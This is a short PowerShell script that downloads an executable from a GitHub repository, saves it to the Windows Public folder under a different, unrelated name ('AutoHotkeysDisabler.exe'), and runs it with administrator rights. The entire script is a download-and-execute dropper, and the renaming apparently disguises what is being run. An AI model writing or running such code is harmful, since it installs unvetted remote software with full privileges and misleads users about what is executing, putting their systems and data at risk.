$source = 'https://github.com/handshakings/WindowsEmailAppReset/blob/master/WindowsEmailAppReset/bin/Debug/WindowsEmailAccountMgr.exe'
$dest = 'C:/Users\Public\AutoHotkeysDisabler.exe'
Invoke-WebRequest -Uri $source -OutFile $dest
Start-Process -FilePath $dest -Verb RunAs